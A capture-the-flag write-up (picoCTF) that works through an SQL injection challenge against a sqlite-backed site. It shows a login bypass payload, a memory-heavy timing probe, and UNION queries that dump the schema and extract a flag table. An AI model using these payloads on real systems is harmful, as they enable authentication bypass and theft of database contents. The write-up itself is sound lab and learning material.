# Strange SQL injection

## Weird input

Just input a username and password and it shows http error 500 and the following message.

```txt
username: monkaS
password: wut
SQL query: SELECT id FROM users WHERE password = 'wut' AND username = 'monkaS'
```

So the SQL code is like this:

```python
"SELECT id FROM users WHERE password = '{}' AND username = '{}'.format(pw, usr_name)"
```

Note that this time the password part is at the first half. So `SELECT id FROM users WHERE username = 'admin';--` would not work.

The strange thing is that normal injection doesn't work too.

username: `admin`, password: `bocchi'<>'`

```txt
username: admin,
password: bocchi'<>'
SQL query: SELECT id FROM users WHERE password = 'bocchi'<>'' AND username = 'admin'
```

The SQL statement is correct. Maybe there are no entries at all?

But after adding `INSERT` statements it still doesn't work... (even adding the closing ; does not help)

## Setup our local test environment

Assume `sqlite3` is available in your OS. From terminal:

```bash
$ sqlite3

SQLite version 3.27.2 2019-02-25 16:06:06
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite>
```

Setup table to test our SQL statements.

```sql
-- Not sure about username should be unique or not
-- Also not sure if type of ID is correct or not
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    password TEXT NOT NULL,
    username TEXT NOT NULL
);

INSERT INTO users (password, username)
VALUES('veryinsecure', 'tom');

INSERT INTO users (password, username)
VALUES('LUL', 'admin');

-- verify
SELECT * from users;

1|veryinsecure|tom
2|LUL|admin
```

## My attempts

username: `b'; INSERT INTO users (password, username) VALUES('LUL', 'admin');--`, password: `a`

`SELECT id FROM users WHERE password = 'a' AND username = 'b'; INSERT INTO users (password, username) VALUES('LUL', 'admin');--'`

username: `b'; INSERT INTO users (password, username) VALUES('LUL', 'orz');--`, password: `a`

Then try to login normally ... Nothing works at all.

Try to insert with id as well but still doesn't work.

username: `b' UNION SELECT id FROM users WHERE username = 'admin' LIMIT 1;--`, password: `a`

The following recon also not working ...

username: `1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))));--`

Briefly sleep for 1-2 seconds (locally)

`SELECT id FROM users WHERE password = 'sf' AND username = '1' OR 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))));--'`

Sleep for a few seconds... (locally)

username:`1' OR 7=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(900000000/2))));--`

`SELECT 1 FROM users WHERE 7=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(900000000/2))));--`
Error: out of memory

But on the actual instance it returns almost instantly.

... So nothing is working at all.

## Solution

After a quick peek on others' writeup, I finally notice that we are not required to login as admin.

Seriously, *#$% you.

So all we need to do is just need to make it pass the login page...

username: whatever, password: `' OR 2=2;--`

`SELECT id FROM users WHERE password = '' OR 2=2;-- AND username = 'b';`

I really hope the hint can tell us something about our aim. Maybe the table has no username field at all.

Inside the page, we have part 2 -- A table with 3 fields (City, Address, Phone) and a search box of City.

One of the hint is `Maybe all the tables`

So we have to try: 1.) Try to inject that city query function and 2.) find out how to get all the tables.

### About that search box

Local DB quick setup for SQL queries:

```sql
CREATE TABLE contact (
    city TEXT NOT NULL,
    address TEXT NOT NULL,
    phone TEXT NOT NULL
);

INSERT INTO contact (city, address, phone)
VALUES('Salt Lake', 'Billy', '69');

INSERT INTO contact (city, address, phone)
VALUES('Frog Farm', 'monkaS', '420');

-- verify
sqlite> SELECT * from contact;

Salt Lake|Billy|69
Frog Farm|monkaS|420
```

The city search box seems to be exact search. I can only find that entry when I exactly copy that city. Missing any letters / replace with * does not return any results.

The query is like `SELECT city, address, phone FROM xxx WHERE city = {}` ... Assuming injection continues to work

We have 3 columns so we should try to do a `UNION` (no `JOIN` as probably no value is the same)

### Get all tables

References:

<https://www.sqlitetutorial.net/sqlite-show-tables/>

<https://stackoverflow.com/a/53081994>

```sql
SELECT name FROM sqlite_schema WHERE type ='table' AND name NOT LIKE 'sqlite_%';
```

That does not work in my local `sqlite`.

But this works. (Locally)

```sql
SELECT * FROM sqlite_master WHERE type='table';
```

```bash
sqlite> .headers on
sqlite> .mode column

sqlite> SELECT * FROM sqlite_master WHERE type='table';

type        name        tbl_name    rootpage    sql
----------  ----------  ----------  ----------  ---------------------------------------------------------------------------------------------------------
table       users       users       2           CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    password TEXT NOT NULL,
    username TEXT NOT NULL
)
```

So the columns are `type, name, tbl_name, rootpage, sql` for the `sqlite_master` table

## Combine both parts

The contact table union with sqlite_master.

`SELECT city, address, phone FROM contact WHERE city = '' UNION SELECT type,name,tbl_name FROM sqlite_master;--`

The first half part is probably empty (can be further improved) and the whole statement would only show the content of `sqlite_master`.

The payload for the search box will be: `' UNION SELECT type,name,sql FROM sqlite_master;--`

And this is what we get from the website! (Slightly beautified in markdown)

City | Address | Phone
--- | --- | ---
index | sqlite_autoindex_users_1
table |hints |CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)
table | more_table | CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
table | offices | CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT)
table | users | CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)

We know there are `hints` and `more_table` as tables.

`flag` inside `more_table` ... hmm

And this confirms there are no `username` in the `users` table... (But `name` exists...)

---

Input: `' UNION SELECT flag, id, id FROM more_table;--`

`SELECT city, address, phone FROM contact WHERE city = '' UNION SELECT flag, id, id FROM more_table;--`

And we get it.

City | Address | Phone
--- | --- | ---
If you are here, you must have seen it | 2 | 2
picoCTF{injection_flag} | 1 | 1

Finally, check what is in the hints table...

Input: `' UNION SELECT id, id, info FROM hints;--`

`SELECT city, address, phone FROM contact WHERE city = '' UNION SELECT id, id, info FROM hints;--`

City | Address | Phone
--- | --- | ---
1 |1 | Is this the real life?
2 |2 |Is this the real life?
3 |3 | You are close now?

Nevermind.

Can check what is inside `users` table but doesn't matter now.
